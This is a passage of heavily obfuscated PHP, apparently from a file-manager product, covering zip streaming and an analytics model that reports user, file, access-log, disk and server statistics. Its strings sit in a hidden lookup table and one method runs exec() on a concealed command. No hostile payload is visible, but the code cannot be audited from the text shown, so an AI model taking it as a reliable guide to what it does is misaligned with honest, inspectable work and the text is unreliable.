$this->packFields($BŞ¼Û®Œ±) . $bñ¤ÙˆØôã; $this->send($fÈ†ŠÜˆÊá); goto Dåâï÷Ù©; c­²áé‹: $DÇ’ªÓ–†¥ =& $_SERVER[Ö]; $E²Óí‡œóš = count($this->files); $E…‚äÜÏø‚ = $this->cdr_ofs; goto C•ÄĞÊ‡ÅŠ; Dåâï÷Ù©: } protected function addCdr() { foreach ($this->files as $c†‹êÆ¨¼¼) { $this->addCdrFile($c†‹êÆ¨¼¼); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $c–İŠººœÑ =& $_SERVER[Ö]; $d×©ø¯µò = $c–İŠººœÑ[198]; if ($this->outputName) { $AÕÉê½ñ‰÷ = trim(str_replace(array($c–İŠººœÑ[112], $c–İŠººœÑ[55], $c–İŠººœÑ[93], $c–İŠººœÑ[67], $c–İŠººœÑ[213], $c–İŠººœÑ[985]), $c–İŠººœÑ[33], $this->outputName)); $AéƒÌ›È¥ = rawurlencode($AÕÉê½ñ‰÷); $d×©ø¯µò .= "\73\40\146\151\154\x65\156\141\155\145\x2a\75\165\164\x66\x2d\x38\47\x27{$AéƒÌ›È¥}"; } $cÀ†‰áŠ‚Ø = array($c–İŠººœÑ[195] => $c–İŠººœÑ[1989], $c–İŠººœÑ[1990] => $d×©ø¯µò, $c–İŠººœÑ[1991] => $c–İŠººœÑ[1992], $c–İŠººœÑ[1993] => $c–İŠººœÑ[1994], $c–İŠººœÑ[1995] => $c–İŠººœÑ[1996]); foreach ($cÀ†‰áŠ‚Ø as $d¤İ¼Æˆ±á => $E‡Ó¾Ú·‡) { header($d¤İ¼Æˆ±á . $c–İŠººœÑ[875] . $E‡Ó¾Ú·‡); } } protected function send($B’·«•¢) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $B’·«•¢); } protected final function dosTime($d„ƒç©Ùù ) { $BáÄ‰‘Áñ¨ =& $_SERVER[Ö]; $CíƒÜ‡ƒ…„ = getdate($d„ƒç©Ùù ); if ($CíƒÜ‡ƒ…„[$BáÄ‰‘Áñ¨[1699]] < 1980) { $CíƒÜ‡ƒ…„ = array($BáÄ‰‘Áñ¨[1699] => 1980, $BáÄ‰‘Áñ¨[1997] => 1, $BáÄ‰‘Áñ¨[1998] => 1, $BáÄ‰‘Áñ¨[1999] => 0, $BáÄ‰‘Áñ¨[2000] => 0, $BáÄ‰‘Áñ¨[2001] => 0); } $CíƒÜ‡ƒ…„[$BáÄ‰‘Áñ¨[1699]] -= 1980; return $CíƒÜ‡ƒ…„[$BáÄ‰‘Áñ¨[1699]] << 25 | $CíƒÜ‡ƒ…„[$BáÄ‰‘Áñ¨[1997]] << 21 | $CíƒÜ‡ƒ…„[$BáÄ‰‘Áñ¨[1998]] << 16 | $CíƒÜ‡ƒ…„[$BáÄ‰‘Áñ¨[1999]] << 11 | $CíƒÜ‡ƒ…„[$BáÄ‰‘Áñ¨[2000]] << 5 | $CíƒÜ‡ƒ…„[$BáÄ‰‘Áñ¨[2001]] >> 1; } protected function packFields($EÑó‚Å´ÉÔ) { $Eß»ë»šè‰ =& $_SERVER[Ö]; $BÔÀ•®é¯ = $Eß»ë»šè‰[33]; $EÓº‹ß÷õË = array(); foreach ($EÑó‚Å´ÉÔ as $F½‰œÔõæº) { $BÔÀ•®é¯ .= $F½‰œÔõæº[0]; $EÓº‹ß÷õË[] = $F½‰œÔõæº[1]; } array_unshift($EÓº‹ß÷õË, $BÔÀ•®é¯); return call_user_func_array($Eß»ë»šè‰[2002], $EÓº‹ß÷õË); } protected function filterFilename($e˜³Ó¨Æ…†) { $EÔ³«®Šğ” =& $_SERVER[Ö]; return str_replace(array($EÔ³«®Šğ”[93], $EÔ³«®Šğ”[4], $EÔ³«®Šğ”[172], $EÔ³«®Šğ”[69], $EÔ³«®Šğ”[112], $EÔ³«®Šğ”[920], $EÔ³«®Šğ”[923], $EÔ³«®Šğ”[267]), $EÔ³«®Šğ”[70], $e˜³Ó¨Æ…†); } } class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($AÖª³†ñ‚¦) { $fÕš”ÛÂÖ =& $_SERVER[Ö]; $b¤ ğà±Úê = array($fÕš”ÛÂÖ[531] => array($fÕš”ÛÂÖ[29] => $fÕš”ÛÂÖ[2003], $fÕš”ÛÂÖ[257] => array($fÕš”ÛÂÖ[206], $fÕš”ÛÂÖ[693], $fÕš”ÛÂÖ[2004], $fÕš”ÛÂÖ[2005])), $fÕš”ÛÂÖ[2006] => array($fÕš”ÛÂÖ[29] => $fÕš”ÛÂÖ[2007], $fÕš”ÛÂÖ[257] => array($fÕš”ÛÂÖ[206], $fÕš”ÛÂÖ[691], $fÕš”ÛÂÖ[2008], $fÕš”ÛÂÖ[2009], $fÕš”ÛÂÖ[2010]))); if (!isset($b¤ ğà±Úê[$AÖª³†ñ‚¦])) { return !1; } $this->optionType = $b¤ ğà±Úê[$AÖª³†ñ‚¦][$fÕš”ÛÂÖ[29]]; $this->field = $b¤ ğà±Úê[$AÖª³†ñ‚¦][$fÕš”ÛÂÖ[257]]; return !0; } public function listData($C°§’Œ¤•Å = false, $CöÚª©³Ô¦ = "\155\157\x64\x69\x66\171\124\x69\x6d\145", $dÍÛõÊğó´ = false) { return parent::listData($C°§’Œ¤•Å, $CöÚª©³Ô¦, $dÍÛõÊğó´); } public function trendList($dÔØ‚”Í‹±) { goto EÏÓˆ‚êÌ–; EÏÓˆ‚êÌ–: $cç¢êã¤ö¨ =& $_SERVER[Ö]; $dîŸÖŠ·‘À = $this->listData(); if ($dîŸÖŠ·‘À) { $A”Í¼ãßñá = end($dîŸÖŠ·‘À); $fµ‹¿áø‘É = date($cç¢êã¤ö¨[2011], strtotime($cç¢êã¤ö¨[2012])); if ($A”Í¼ãßñá[$cç¢êã¤ö¨[206]] == $fµ‹¿áø‘É) { return $dîŸÖŠ·‘À; } $DÉÙ‰À¼µÎ = strtotime($A”Í¼ãßñá[$cç¢êã¤ö¨[206]]); } goto EÏ³ô×â; EÏ³ô×â: if (!isset($DÉÙ‰À¼µÎ)) { $E£ŒÒ ´™ğ = $dÔØ‚”Í‹± == $cç¢êã¤ö¨[531] ? $cç¢êã¤ö¨[473] : $cç¢êã¤ö¨[745]; $DÉÙ‰À¼µÎ = Model($E£ŒÒ ´™ğ)->min($cç¢êã¤ö¨[183]); } $aŒóÅª   = $cç¢êã¤ö¨[2013] . ucfirst($dÔØ‚”Í‹±); $aˆ‚²¯Ï = $this->dateList($DÉÙ‰À¼µÎ); goto d½ôŒ²©ÑŸ; d½ôŒ²©ÑŸ: foreach ($aˆ‚²¯Ï as $fµ‹¿áø‘É) { $this->{$aŒóÅª  }($fµ‹¿áø‘É); } return $this->listData(); goto Eßæ‹ØÂÀ¢; Eßæ‹ØÂÀ¢: } private function dateList($EÜÄÑ®à†) { $C¶ËâÂ¥øã =& $_SERVER[Ö]; $Aµì½§·š» = $EÜÄÑ®à†; $açª½¦ä¸‘ = strtotime($C¶ËâÂ¥øã[2012]); $CöÙÕåá„± = array(); while ($Aµì½§·š» <= $açª½¦ä¸‘) { $CöÙÕåá„±[] = date($C¶ËâÂ¥øã[2011], $Aµì½§·š»); $Aµì½§·š» = strtotime($C¶ËâÂ¥øã[2014], $Aµì½§·š»); } return $CöÙÕåá„±; } public function _recordUser($Fáˆå—©¹³ = '') { goto AÃ»ñ•Ã£’; F™èºÃŠ…²: $D¬­Å‰¨Ìø = array($D½¸¦Õ¢Š[183] => array($D½¸¦Õ¢Š[922], $cƒ‘»ôä–®)); $FÏ­¹éåØš = Model($D½¸¦Õ¢Š[473])->where($D¬­Å‰¨Ìø)->count($D½¸¦Õ¢Š[1414]); $D¬­Å‰¨Ìø[$D½¸¦Õ¢Š[183]] = array($D½¸¦Õ¢Š[317], array($f¿Úõ¾ŠĞñ, $cƒ‘»ôä–®)); goto d†Ç‚‰®ï‘; cŸµõíÈ: $Dîï¡áŞ‡ = array($D½¸¦Õ¢Š[206] => $Fáˆå—©¹³, $D½¸¦Õ¢Š[693] => (int) $FÏ­¹éåØš, $D½¸¦Õ¢Š[2004] => (int) $A±®ù¬¥Ùë, $D½¸¦Õ¢Š[2005] => (int) $B©´‘Ş´); return $this->insert($Dîï¡áŞ‡); goto d§ğõÕ¶ˆ; d†Ç‚‰®ï‘: $A±®ù¬¥Ùë = Model($D½¸¦Õ¢Š[473])->where($D¬­Å‰¨Ìø)->count($D½¸¦Õ¢Š[1414]); $D¬­Å‰¨Ìø[$D½¸¦Õ¢Š[29]] = $D½¸¦Õ¢Š[2017]; $B©´‘Ş´ = Model($D½¸¦Õ¢Š[2018])->where($D¬­Å‰¨Ìø)->count($D½¸¦Õ¢Š[2019]); goto cŸµõíÈ; AÃ»ñ•Ã£’: $D½¸¦Õ¢Š =& $_SERVER[Ö]; $f¿Úõ¾ŠĞñ = strtotime(date($D½¸¦Õ¢Š[2015], strtotime($Fáˆå—©¹³))); $cƒ‘»ôä–® = strtotime(date($D½¸¦Õ¢Š[2016], strtotime($Fáˆå—©¹³))); goto F™èºÃŠ…²; d§ğõÕ¶ˆ: } public function _recordStore($ağÒì’·¬˜ = '') { goto AØ·È¨âø‡; FÚàª¢¨ã: $DäÉöÑËçä[$F²Ñ¸”Ş‰ù[367]] = 1; $B–«š¼ÔºÉ = Model($F²Ñ¸”Ş‰ù[745])->where($DäÉöÑËçä)->sum($F²Ñ¸”Ş‰ù[77]); $DäÉöÑËçä[$F²Ñ¸”Ş‰ù[367]] = 2; goto BØ’Ş‰‹ø¶; cÉŞ¿¨„Ûé: $F‘ÙÀ¦¢œ¡ = Model($F²Ñ¸”Ş‰ù[418])->where($DäÉöÑËçä)->sum($F²Ñ¸”Ş‰ù[77]); $DäÉöÑËçä[$F²Ñ¸”Ş‰ù[366]] = 0; $Eê½¹†ñì¥ = Model($F²Ñ¸”Ş‰ù[745])->where($DäÉöÑËçä)->sum($F²Ñ¸”Ş‰ù[77]); goto FÚàª¢¨ã; BØ’Ş‰‹ø¶: $A»ë¼îæ = Model($F²Ñ¸”Ş‰ù[745])->where($DäÉöÑËçä)->sum($F²Ñ¸”Ş‰ù[77]); $B½øÒÃ’ªö = array($F²Ñ¸”Ş‰ù[206] => $ağÒì’·¬˜, $F²Ñ¸”Ş‰ù[691] => (int) $Eê½¹†ñì¥, $F²Ñ¸”Ş‰ù[2008] => (int) $F‘ÙÀ¦¢œ¡, $F²Ñ¸”Ş‰ù[2009] => (int) $B–«š¼ÔºÉ, $F²Ñ¸”Ş‰ù[2010] => (int) $A»ë¼îæ); return $this->insert($B½øÒÃ’ªö); goto cğË”¥İ¯÷; AØ·È¨âø‡: $F²Ñ¸”Ş‰ù =& $_SERVER[Ö]; $Eˆó¢³“Ò‹ = strtotime(date($F²Ñ¸”Ş‰ù[2016], strtotime($ağÒì’·¬˜))); $DäÉöÑËçä = array($F²Ñ¸”Ş‰ù[183] => array($F²Ñ¸”Ş‰ù[922], $Eˆó¢³“Ò‹)); goto cÉŞ¿¨„Ûé; cğË”¥İ¯÷: } public function trend($dßé¬Ïğ‡ì, $e‡øŒµÍ„…) { goto bã›¦İ¨Á; aØ£ª‡áì: return $cÌó¯’™¶; goto aœ†•ùÜ£; bã›¦İ¨Á: $bµà‡ê¡ì =& $_SERVER[Ö]; if (!$this->init($dßé¬Ïğ‡ì)) { return !1; } $f¯‡˜ËË¤ = $this->trendList($dßé¬Ïğ‡ì); goto cÛÆùÍÅ; DŠÀË›ö: if (empty($f¯‡˜ËË¤)) { $d–Ù‰‹ˆŒ = date($bµà‡ê¡ì[2011], strtotime($bµà‡ê¡ì[2012])); $AõÂÚÊôƒ­ = array($bµà‡ê¡ì[206] => $d–Ù‰‹ˆŒ); foreach ($dÊœ¡ÚÏÃœ[$dßé¬Ïğ‡ì] as $bàš½·‘ù => $B‘ÅÃò±å) { $AõÂÚÊôƒ­[$bàš½·‘ù] = 0; } $f¯‡˜ËË¤[] = $AõÂÚÊôƒ­; } $cÌó¯’™¶ = array(); foreach ($f¯‡˜ËË¤ as $B‘ÅÃò±å) { if ($dßé¬Ïğ‡ì == $bµà‡ê¡ì[2006] && $B‘ÅÃò±å[$bµà‡ê¡ì[2008]] > $B‘ÅÃò±å[$bµà‡ê¡ì[691]]) { $B‘ÅÃò±å[$bµà‡ê¡ì[2008]] = $B‘ÅÃò±å[$bµà‡ê¡ì[691]]; } foreach ($dÊœ¡ÚÏÃœ[$dßé¬Ïğ‡ì] as $bàš½·‘ù => $fŞ®›äë) { $Aèí²À÷§… = array($bµà‡ê¡ì[206] => $B‘ÅÃò±å[$bµà‡ê¡ì[206]], $bµà‡ê¡ì[1320] => $fŞ®›äë); $Aèí²À÷§…[$bñŠÛŞ©ë¬[$dßé¬Ïğ‡ì]] = isset($B‘ÅÃò±å[$bàš½·‘ù]) ? $B‘ÅÃò±å[$bàš½·‘ù] : 0; $cÌó¯’™¶[] = $Aèí²À÷§…; } } goto aØ£ª‡áì; cÛÆùÍÅ: if ($f¯‡˜ËË¤ && $e‡øŒµÍ„… != $bµà‡ê¡ì[1389]) { $a£„Ù³Ù®ó = $f¯‡˜ËË¤[0][$bµà‡ê¡ì[206]]; $ağÉ”÷„ = $this->validDate($e‡øŒµÍ„…, $a£„Ù³Ù®ó); $cÊ…Œ—“´ = array(); $aë·»ä–áê = array_to_keyvalue($f¯‡˜ËË¤, $bµà‡ê¡ì[206]); foreach ($ağÉ”÷„ as $d–Ù‰‹ˆŒ) { if (isset($aë·»ä–áê[$d–Ù‰‹ˆŒ])) { $Aèí²À÷§… = $aë·»ä–áê[$d–Ù‰‹ˆŒ]; } else { $Aèí²À÷§… = end($f¯‡˜ËË¤); $Aèí²À÷§…[$bµà‡ê¡ì[206]] = $d–Ù‰‹ˆŒ; if ($dßé¬Ïğ‡ì == $bµà‡ê¡ì[531]) { $Aèí²À÷§…[$bµà‡ê¡ì[2004]] = $Aèí²À÷§…[$bµà‡ê¡ì[2005]] = 0; } } $cÊ…Œ—“´[] = $Aèí²À÷§…; } $f¯‡˜ËË¤ = $cÊ…Œ—“´; } $dÊœ¡ÚÏÃœ = array($bµà‡ê¡ì[531] => array($bµà‡ê¡ì[693] => LNG($bµà‡ê¡ì[2020]), $bµà‡ê¡ì[2004] => LNG($bµà‡ê¡ì[2021]), $bµà‡ê¡ì[2005] => LNG($bµà‡ê¡ì[2022])), $bµà‡ê¡ì[2006] => array($bµà‡ê¡ì[691] => LNG($bµà‡ê¡ì[2023]), $bµà‡ê¡ì[2008] => LNG($bµà‡ê¡ì[2024]), $bµà‡ê¡ì[2009] => LNG($bµà‡ê¡ì[2025]), $bµà‡ê¡ì[2010] => LNG($bµà‡ê¡ì[2026]))); $bñŠÛŞ©ë¬ = array($bµà‡ê¡ì[531] => $bµà‡ê¡ì[2027], $bµà‡ê¡ì[2006] => $bµà‡ê¡ì[77]); goto DŠÀË›ö; aœ†•ùÜ£: } public function validDate($D„¿ïÃ½ƒ, $AŒ–—£èã) { goto Eœ™ãå²Í; AğÜœÒ™ä°: switch ($D„¿ïÃ½ƒ) { case $AÄÚ†Ğµ´º[1396]: $E’—¢¢›ÁÌ = mktime(0, 0, 0, date($AÄÚ†Ğµ´º[2028]), date($AÄÚ†Ğµ´º[2029]) - date($AÄÚ†Ğµ´º[1211]) + 7 - 7, date($AÄÚ†Ğµ´º[2030])); $b¶¶±ŸÁÚ = 0; do { $EÒÉ¸¹Ä™ = date($AÄÚ†Ğµ´º[2011], $E’—¢¢›ÁÌ - 3600 * 24 * 7 * $b¶¶±ŸÁÚ); $fìïõ´°ãÆ[] = $EÒÉ¸¹Ä™; $b¶¶±ŸÁÚ++; } while ($AŒ–—£èã < $EÒÉ¸¹Ä™); break; case $AÄÚ†Ğµ´º[1394]: $b¶¶±ŸÁÚ = 1; do { $A¬¨‡‹é÷¥ = date($AÄÚ†Ğµ´º[2031], strtotime("\x2d\40{$b¶¶±ŸÁÚ}\40\155\x6f\156\x74\150\x73")); $fìïõ´°ãÆ[] = $A¬¨‡‹é÷¥; $b¶¶±ŸÁÚ++; } while ($AŒ–—£èã < $A¬¨‡‹é÷¥); break; case $AÄÚ†Ğµ´º[1699]: $E±–÷ÅÅÕ¯ = (int) date($AÄÚ†Ğµ´º[2030], strtotime($AŒ–—£èã)); $B…õÒ±Âåˆ = (int) date($AÄÚ†Ğµ´º[2030]); if ($E±–÷ÅÅÕ¯ >= $B…õÒ±Âåˆ) { break; } for ($E±–÷ÅÅÕ¯; $E±–÷ÅÅÕ¯ < $B…õÒ±Âåˆ; $E±–÷ÅÅÕ¯++) { $fìïõ´°ãÆ[] = $E±–÷ÅÅÕ¯ . $AÄÚ†Ğµ´º[2032]; } break; default: break; } if ($AŒ–—£èã > end($fìïõ´°ãÆ)) { array_pop($fìïõ´°ãÆ); } sort($fìïõ´°ãÆ); goto bé©¹Ë·Íâ; Eœ™ãå²Í: $AÄÚ†Ğµ´º =& $_SERVER[Ö]; $f½åÂèŞ”ã = date($AÄÚ†Ğµ´º[2011], strtotime($AÄÚ†Ğµ´º[2012])); $fìïõ´°ãÆ = array($f½åÂèŞ”ã); goto AğÜœÒ™ä°; bé©¹Ë·Íâ: return $fìïõ´°ãÆ; goto C¯¡àíÅà; C¯¡àíÅà: } public function listTable($D·¹èİŒ¦) { $AºôŒé‘‡ˆ = ucfirst($D·¹èİŒ¦); return Model($AºôŒé‘‡ˆ)->listData(); } public function option($F‰£Ş¢µ¦·) { $eÓ¯ºìÆÕƒ = $_SERVER[Ö][2033] . ucfirst($F‰£Ş¢µ¦·); return $this->{$eÓ¯ºìÆÕƒ}(); } private function optionUser() { goto bšŸ¢ø•Ğ; EÌ›ÙÕ©Ë: $DÕÁ”¹ºé£ = strtotime($Eœ¢ø øÏ[2035]); $a±ÓØß½Ë = array($Eœ¢ø øÏ[2036] => array($Eœ¢ø øÏ[923], $DÕÁ”¹ºé£)); $EêÈğá¾å = (int) Model($Eœ¢ø øÏ[473])->where($a±ÓØß½Ë)->count($Eœ¢ø øÏ[1414]); goto Fƒ÷òãÁ£Œ; Cá¥¸æ¸: $aßãçğòÌ± = Model($Eœ¢ø øÏ[473])->where($a±ÓØß½Ë)->count($Eœ¢ø øÏ[1414]); return array($Eœ¢ø øÏ[688] => (int) $F†ˆÁ¬©í®, $Eœ¢ø øÏ[2037] => (int) ($F†ˆÁ¬©í® - $C Õ¢ÛÛí), $Eœ¢ø øÏ[2038] => (int) $C Õ¢ÛÛí, $Eœ¢ø øÏ[2039] => (int) $aßãçğòÌ±, $Eœ¢ø øÏ[2040] => $EêÈğá¾å); goto e×•ÑãŸ; bšŸ¢ø•Ğ: $Eœ¢ø øÏ =& $_SERVER[Ö]; $F†ˆÁ¬©í® = Model($Eœ¢ø øÏ[473])->count($Eœ¢ø øÏ[1414]); $C Õ¢ÛÛí = Model($Eœ¢ø øÏ[473])->where($Eœ¢ø øÏ[2034])->count($Eœ¢ø øÏ[1414]); goto EÌ›ÙÕ©Ë; Fƒ÷òãÁ£Œ: if (!$EêÈğá¾å) { $EêÈğá¾å = 1; } $DÕÁ”¹ºé£ = strtotime(date($Eœ¢ø øÏ[2015])); $a±ÓØß½Ë = array($Eœ¢ø øÏ[2036] => array($Eœ¢ø øÏ[923], $DÕÁ”¹ºé£)); goto Cá¥¸æ¸; e×•ÑãŸ: } private function optionFile() { goto B”ëÛ¢‹í¼; cµÔìÎŒ¼Œ: $A¸ªªÎøŸ = $BÅ’—Äòˆß[$A­±ˆ‚îÏ÷[2008]]; $EÅœìÉ¸âË = Model($A­±ˆ‚îÏ÷[745])->where(array($A­±ˆ‚îÏ÷[366] => 0))->count($A­±ˆ‚îÏ÷[365]); $e¦Ìš‹­è„ = array($A­±ˆ‚îÏ÷[366] => 0, $A­±ˆ‚îÏ÷[183] => array($A­±ˆ‚îÏ÷[923], strtotime(date($A­±ˆ‚îÏ÷[2015])))); goto e‚õŠ„Å¤; B”ëÛ¢‹í¼: $A­±ˆ‚îÏ÷ =& $_SERVER[Ö]; $BÅ’—Äòˆß = $this->sourceSize(); $Fñº£»Ü‘Ó = $BÅ’—Äòˆß[$A­±ˆ‚îÏ÷[77]]; goto cµÔìÎŒ¼Œ; e‚õŠ„Å¤: $eÏËñ‚“”í = Model($A­±ˆ‚îÏ÷[745])->where($e¦Ìš‹­è„)->sum($A­±ˆ‚îÏ÷[77]); $c¶çËøªå¡ = Model($A­±ˆ‚îÏ÷[745])->where($e¦Ìš‹­è„)->count($A­±ˆ‚îÏ÷[365]); return array($A­±ˆ‚îÏ÷[691] => $Fñº£»Ü‘Ó, $A­±ˆ‚îÏ÷[2008] => $A¸ªªÎøŸ, $A­±ˆ‚îÏ÷[2041] => $Fñº£»Ü‘Ó - $A¸ªªÎøŸ, $A­±ˆ‚îÏ÷[2042] => (int) $eÏËñ‚“”í, $A­±ˆ‚îÏ÷[693] => (int) $EÅœìÉ¸âË, $A­±ˆ‚îÏ÷[2043] => (int) $c¶çËøªå¡); goto dâÊßªëÍµ; dâÊßªëÍµ: } private function optionAccess() { $cĞìÒÆö’ù =& $_SERVER[Ö]; return array($cĞìÒÆö’ù[688] => $this->typeLogCnt(), $cĞìÒÆö’ù[102] => $this->typeLogCnt($cĞìÒÆö’ù[102]), $cĞìÒÆö’ù[400] => $this->typeLogCnt($cĞìÒÆö’ù[400]), $cĞìÒÆö’ù[2044] => $this->typeLogCnt($cĞìÒÆö’ù[2044]), $cĞìÒÆö’ù[2045] => $this->typeLogCnt($cĞìÒÆö’ù[2045]), $cĞìÒÆö’ù[531] => $this->typeLogCnt($cĞìÒÆö’ù[33], $cĞìÒÆö’ù[2019])); } private function typeLogCnt($dÁ«â¯âß = '', $bÊ®Î®Æ”· = "\x69\x64") { goto cŠÚğÎá­ñ; cŠÚğÎá­ñ: $Bà çˆ›˜ó =& $_SERVER[Ö]; $a½ÇÌœò¬‹ = array($Bà çˆ›˜ó[102] => array($Bà çˆ›˜ó[2046], $Bà çˆ›˜ó[2047]), $Bà çˆ›˜ó[400] => array($Bà çˆ›˜ó[2048], $Bà çˆ›˜ó[2049]), $Bà çˆ›˜ó[2044] => array($Bà çˆ›˜ó[2050], $Bà çˆ›˜ó[2051]), $Bà çˆ›˜ó[2045] => array($Bà çˆ›˜ó[2052], $Bà çˆ›˜ó[2053]), $Bà çˆ›˜ó[2054] => array($Bà çˆ›˜ó[2055], $Bà çˆ›˜ó[2056], $Bà çˆ›˜ó[2057])); $CÈ‰±ó½æ = strtotime(date($Bà çˆ›˜ó[2015])); goto a«¼½•¡°‚; e’¤‹øâ¬: return (int) $dñÅôĞƒÜÎ; goto BªÂğÆùãŒ; a«¼½•¡°‚: $aëÖÈĞ›Ùë = array($Bà çˆ›˜ó[183] => array($Bà çˆ›˜ó[923], $CÈ‰±ó½æ)); if ($dÁ«â¯âß) { $aëÖÈĞ›Ùë[$Bà çˆ›˜ó[29]] = array($Bà çˆ›˜ó[7], $a½ÇÌœò¬‹[$dÁ«â¯âß]); } $dñÅôĞƒÜÎ = Model($Bà çˆ›˜ó[2018])->where($aëÖÈĞ›Ùë)->count($bÊ®Î®Æ”·); goto e’¤‹øâ¬; BªÂğÆùãŒ: } private function optionServer() { goto CÂÓÄ‰¢‘; c‰™¥´õ“: return array($Cáíò½´­[2060] => $Eõ–×Œ´À„ ? $Eõ–×Œ´À„[$Cáíò½´­[2061]] : 0, $Cáíò½´­[2062] => $Eõ–×Œ´À„ ? $Eõ–×Œ´À„[$Cáíò½´­[2063]] : 0, $Cáíò½´­[2064] => (int) $DøÌÃÙõ®[$Cáíò½´­[2061]] * 1024 * 1024 * 1024, $Cáíò½´­[2065] => (int) $EÜ—’‘Âæ‚, $Cáíò½´­[2066] => ucfirst($a³à„¾Š‰á), $Cáíò½´­[2067] => $Cáíò½´­[2068] . PHP_VERSION, $Cáíò½´­[2069] => phpBuild64() ? 64 : 32, $Cáíò½´­[687] => str_replace($Cáíò½´­[2070], $Cáíò½´­[899], $e×çÂâ•ß), $Cáíò½´­[333] => ucfirst($cé–¥öœ’Œ), $Cáíò½´­[28] => $_SERVER[$Cáíò½´­[2071]]); goto B²£°ÌÙã‡; CÂÓÄ‰¢‘: $Cáíò½´­ =& $_SERVER[Ö]; $Eõ–×Œ´À„ = $this->diskDriver(); $DøÌÃÙõ® = KodIO::defaultDriver(); goto eÎ¬ìŠÍˆ; c÷¡Áƒ©éé: if ($e×çÂâ•ß == $Cáíò½´­[717]) { $B›ˆ–£×¯ª = explode($Cáíò½´­[1069], $A¸²£…£Åê[$Cáíò½´­[882]]); $e×çÂâ•ß = $B›ˆ–£×¯ª[0]; } if ($e×çÂâ•ß == $Cáíò½´­[720] || $e×çÂâ•ß == $Cáíò½´­[721]) { $B½¿°¡­ñŠ = Model()->db()->query($Cáíò½´­[2058]); $d›Éƒƒ¢¿ì = $B½¿°¡­ñŠ[0] && isset($B½¿°¡­ñŠ[0][$Cáíò½´­[1319]]) ? $B½¿°¡­ñŠ[0][$Cáíò½´­[1319]] : 0; $e×çÂâ•ß = $Cáíò½´­[2059] . ($d›Éƒƒ¢¿ì ? $Cáíò½´­[8] . $d›Éƒƒ¢¿ì : $Cáíò½´­[33]); } $cé–¥öœ’Œ = $GLOBALS[$Cáíò½´­[6]][$Cáíò½´­[333]][$Cáíò½´­[746]]; goto c‰™¥´õ“; eÎ¬ìŠÍˆ: $eÕ´¢ÆÑŞ‡ = array($Cáíò½´­[736] => $DøÌÃÙõ®[$Cáíò½´­[363]]); $EÜ—’‘Âæ‚ = Model($Cáíò½´­[418])->where($eÕ´¢ÆÑŞ‡)->sum($Cáíò½´­[77]); $Bº°ÄÑ¬êã = explode($Cáíò½´­[50], $_SERVER[$Cáíò½´­[137]]); goto FöĞì½ÅªÕ; FöĞì½ÅªÕ: $a³à„¾Š‰á = $Bº°ÄÑ¬êã[0]; $A¸²£…£Åê = $GLOBALS[$Cáíò½´­[6]][$Cáíò½´­[17]]; $e×çÂâ•ß = $A¸²£…£Åê[$Cáíò½´­[883]]; goto c÷¡Áƒ©éé; B²£°ÌÙã‡: } private function diskDriver() { goto DŒøÏ£Ì; C…¶š•ïí: if ($cô¡«ã‘) { $dªÚºò°Ì = $dª¡‰¸©•Ù[2074]; if (function_exists($dª¡‰¸©•Ù[2075])) { exec($dª¡‰¸©•Ù[2076], $aÕ²ƒáá‚º); $dªÚºò°Ì = $aÕ²ƒáá‚º[1] . $dª¡‰¸©•Ù[8]; } } if (!file_exists($dªÚºò°Ì)) { return; } $d½´‡ÄöÚ‡ = @disk_total_space($dªÚºò°Ì); goto A†¨«ñ´’; DŒøÏ£Ì: $dª¡‰¸©•Ù =& $_SERVER[Ö]; $dªÚºò°Ì = $dª¡‰¸©•Ù[8]; $cô¡«ã‘ = $GLOBALS[$dª¡‰¸©•Ù[6]][$dª¡‰¸©•Ù[2072]] == $dª¡‰¸©•Ù[2073]; goto C…¶š•ïí; A†¨«ñ´’: $dğ¬ŠÚ¹Â = $d½´‡ÄöÚ‡ - @disk_free_space($dªÚºò°Ì); return array($dª¡‰¸©•Ù[2061] => $d½´‡ÄöÚ‡, $dª¡‰¸©•Ù[2063] => $dğ¬ŠÚ¹Â); goto Dá¹¯œ¥ä÷; Dá¹¯œ¥ä÷: } public function fileChart($b ‰¾¤Ø ƒ) { goto bÁ®®Îï¦¨; F˜ö©‘âÜ¡: $d—µÀ¼•ö = $this->sourceSize(); $bäõÁÀ×Šƒ = array($dëßÆ›·ì°[457] => 0, $dëßÆ›·ì°[367] => 1); $CªİÎ­˜‚ò = Model($dëßÆ›·ì°[745])->where($bäõÁÀ×Šƒ)->sum($dëßÆ›·ì°[77]); goto d¥„Ó×Ó; d¥„Ó×Ó: $bäõÁÀ×Šƒ[$dëßÆ›·ì°[367]] = 2; $fÔ¤ø¹àî‚ = Model($dëßÆ›·ì°[745])->where($bäõÁÀ×Šƒ)->sum($dëßÆ›·ì°[77]); return array($dëßÆ›·ì°[691] => $d—µÀ¼•ö[$dëßÆ›·ì°[77]], $dëßÆ›·ì°[2008] => $d—µÀ¼•ö[$dëßÆ›·ì°[2008]], $dëßÆ›·ì°[2009] => (int) $CªİÎ­˜‚ò, $dëßÆ›·ì°[2010] => (int) $fÔ¤ø¹àî‚); goto Aõ‹Ë¾è¥; bÁ®®Îï¦¨: $dëßÆ›·ì° =& $_SERVER[Ö]; if (isset($b ‰¾¤Ø ƒ[$dëßÆ›·ì°[1414]])) { return Model($dëßÆ›·ì°[745])->userFileTypeProfile($b ‰¾¤Ø ƒ[$dëßÆ›·ì°[1414]]); } if (isset($b ‰¾¤Ø ƒ[$dëßÆ›·ì°[2077]])) { return Model($dëßÆ›·ì°[745])->groupFileTypeProfile($b ‰¾¤Ø ƒ[$dëßÆ›·ì°[2077]]); } goto F˜ö©‘âÜ¡; Aõ‹Ë¾è¥: } private function sourceSize() { $f­÷¬Ç‘¿Á =& $_SERVER[Ö]; $f¢ŞÅ§”‚Í = Model($f­÷¬Ç‘¿Á[745])->where(array($f­÷¬Ç‘¿Á[366] => 0))->sum($f­÷¬Ç‘¿Á[77]); $föîÄôÀŠ÷ = Model($f­÷¬Ç‘¿Á[418])->sum($f­÷¬Ç‘¿Á[77]); if ($föîÄôÀŠ÷ > $f¢ŞÅ§”‚Í) { $föîÄôÀŠ÷ = $f¢ŞÅ§”‚Í; } return array($f­÷¬Ç‘¿Á[77] => (int) $f¢ŞÅ§”‚Í, $f­÷¬Ç‘¿Á[2008] => (int) $föîÄôÀŠ÷); } } goto Bª„º¬—Ÿ; AôÔåéí: define($_SERVER[Ö][0], $_SERVER[Ö][1]); $_SERVER[Ç·ÕÂû¼„] = 